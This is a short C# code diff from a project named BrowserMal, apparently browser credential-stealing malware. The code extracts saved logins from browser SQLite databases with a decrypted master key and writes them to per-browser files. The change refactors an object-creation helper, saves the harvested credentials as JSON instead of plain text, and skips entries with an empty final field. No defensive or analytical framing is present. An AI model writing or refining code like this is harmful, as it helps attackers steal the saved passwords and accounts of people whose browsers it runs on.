@@ -4,9 +4,9 @@ using BrowserMal.Filesaver;
 using BrowserMal.Util;
 using SqliteReader;
 using System;
-using System.Collections;
 using System.Collections.Generic;
 using System.IO;
+using System.Linq;
 
 namespace BrowserMal.Manager
 {
@@ -41,7 +41,7 @@ namespace BrowserMal.Manager
                 if (result.Count == 0)
                     continue;
 
-                FileManager.Save<T>(result, $"{browser.Name}_{tableName}.txt");
+                FileManager.Save<T>(result, $"{browser.Name}_{tableName}.json");
             }
         }
 
@@ -61,20 +61,7 @@ namespace BrowserMal.Manager
             return creds;
         }
 
-        private IList CreateInstance(Type t)
-        {
-            var listType = typeof(List<>);
-            var constructedListType = listType.MakeGenericType(t);
-            var instance = Activator.CreateInstance(constructedListType);
-            return (IList)instance;
-        }
-
-        private T CreateInstanceOfType(Type t, object[] args)
-        {
-            var type = typeof(T);
-            var instance = Activator.CreateInstance(type, args);
-            return (T)instance;
-        }
+        private T CreateInstanceOfType(object[] args) => (T)Activator.CreateInstance(typeof(T), args);
 
         private List<T> GetProfileLogins(string path, byte[] masterKey)
         {
@@ -89,7 +76,10 @@ namespace BrowserMal.Manager
                 {
                     string[] values = GrabSqliteValues(columnNames, ref sqLiteHandler, i, masterKey);
 
-                    T obj = CreateInstanceOfType(typeof(T), values);
+                    if (string.IsNullOrEmpty(values.Last()))
+                        continue;
+
+                    T obj = CreateInstanceOfType(values);
                     generic.Add(obj);
                  
                 }
